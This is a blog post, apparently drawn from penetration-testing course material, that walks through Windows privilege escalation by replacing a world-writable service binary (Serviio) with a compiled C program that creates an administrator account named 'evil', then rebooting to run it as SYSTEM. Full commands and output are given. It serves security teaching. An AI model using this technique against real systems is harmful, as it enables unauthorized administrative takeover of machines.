---
description: >-
  Insecure File Permissions
title: Insecure File Permissions              # Add title here
date: 2022-11-11 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Windows - Insecure File Permissions]                     # Change Templates to Writeup
tags: [insecure file permissions, windows privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
A common way to elevate privileges on a Windows system is to exploit insecure file permissions on services that run as _nt authority\\system_.

For example, consider a scenario in which a software developer creates a program that runs as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing full read and write access to all members of the _Everyone_ group. As a result, a lower-privileged user could replace the program with a malicious one. When the service is restarted or the machine is rebooted, the malicious file will be executed with SYSTEM privileges.

This type of vulnerability exists on our Windows client. Let's validate the vulnerability and exploit it.

In one of the previous sections, we showed how to list running services with _tasklist_. Alternatively, we could use the PowerShell Get-WmiObject cmdlet with the win32_service WMI class. In this example, we will pipe the output to Select-Object to display the fields we are interested in and use Where-Object to display running services ({$_.State -like 'Running'}):

```powershell
PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

Name                  State   PathName
----                  -----   --------
AudioEndpointBuilder  Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRes
Audiosrv              Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRe
...
Power                 Running C:\Windows\system32\svchost.exe -k DcomLaunch
ProfSvc               Running C:\Windows\system32\svchost.exe -k netsvcs
RpcEptMapper          Running C:\Windows\system32\svchost.exe -k RPCSS
RpcSs                 Running C:\Windows\system32\svchost.exe -k rpcss
SamSs                 Running C:\Windows\system32\lsass.exe
Schedule              Running C:\Windows\system32\svchost.exe -k netsvcs
SENS                  Running C:\Windows\system32\svchost.exe -k netsvcs
Serviio               Running C:\Program Files\Serviio\bin\ServiioService.exe
ShellHWDetection      Running C:\Windows\System32\svchost.exe -k netsvcs
...
```

Based on this output, the Serviio service stands out as it is installed in the Program Files directory. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software. These circumstances make it more prone to this type of vulnerability.

As a next step, we'll enumerate the permissions on the target service with the _icacls_ Windows utility. This utility will output the service's Security Identifiers (or SIDs) followed by a permission mask, which are defined in the icacls documentation. The most relevant masks and permissions are listed below:

|MASK|PERMISSIONS|
|------|-----------------|
|F| Full Access |
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

We can run icacls, passing the full service name as an argument. The command output will enumerate the associated permissions:

```powershell
C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
                                                NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

As suspected, the permissions associated with the ServiioService.exe executable are quite interesting. Specifically, it appears that any user (BUILTIN\\Users) on the system has full read and write access to it. This is a serious vulnerability.

In order to exploit this type of vulnerability, we can replace ServiioService.exe with our own malicious binary and then trigger it by restarting the service or rebooting the machine.

We'll demonstrate this attack with an example. The following C code will create a user named "evil" and add that user to the local Administrators group using the _system_ function. The compiled version of this code will serve as our malicious binary:

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}
```

Next, we'll cross-compile the code on our Kali machine with i686-w64-mingw32-gcc, using -o to specify the name of the compiled executable:

```bash
kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

We can transfer it to our target and replace the original ServiioService.exe binary with our malicious copy:

```powershell
C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
        1 file(s) moved.

C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
        1 file(s) moved.

C:\Users\student> dir "C:\Program Files\Serviio\bin\"
 Volume in drive C has no label.
 Volume Serial Number is 56B9-BB74

 Directory of C:\Program Files\Serviio\bin

01/26/2018  07:21 AM    <DIR>          .
01/26/2018  07:21 AM    <DIR>          ..
12/04/2016  08:30 PM               867 serviio.bat
01/26/2018  07:19 AM            48,373 ServiioService.exe
12/04/2016  08:30 PM                10 ServiioService.exe.vmoptions
12/04/2016  08:30 PM           413,696 ServiioService_original.exe
               4 File(s)        462,946 bytes
               2 Dir(s)   3,826,667,520 bytes free
```

In order to execute the binary, we can attempt to restart the service.

```powershell
C:\Users\student> net stop Serviio
System error 5 has occurred.

Access is denied.
```

Unfortunately, it seems that we do not have enough privileges to stop the Serviio service. This is expected as most services are managed by administrative users.

Since we do not have permission to manually restart the service, we must consider another approach. If the service is set to "Automatic", we may be able to restart the service by rebooting the machine. Let's check the start options of the Serviio service with the help of the Windows Management Instrumentation Command-line:

```powershell
C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode
Caption  Name     StartMode  State
Serviio  Serviio  Auto       Running
```

This service will automatically start after a reboot. Now, let's use the whoami command to determine if our current user has the rights to restart the system:

```powershell
C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The listing above shows that our user has been granted shutdown privileges (_SeShutdownPrivilege_) (among others) and therefore we should be able to initiate a system shutdown or reboot. Note that the _Disabled_ state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested, and hence is not currently using, the _SeShutdownPrivilege_ privilege.

If the _SeShutdownPrivilege_ was not present, we would have to wait for the victim to manually start the service, which would be much less convenient for us.

Let's go ahead and reboot (/r) in zero seconds (/t 0):

```powershell
C:\Users\student\Desktop> shutdown /r /t 0 
```

Now that the reboot is complete, we should be able to log in to the target machine using the username "evil" with a password of "Ev!lpass". After that, we can confirm that the evil user is part of the local Administrators group with the net localgroup command.

```powershell
C:\Users\evil> net localgroup Administrators
Alias name     Administrators
Comment   Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
corp\Domain Admins
corp\offsec
evil
The command completed successfully.
```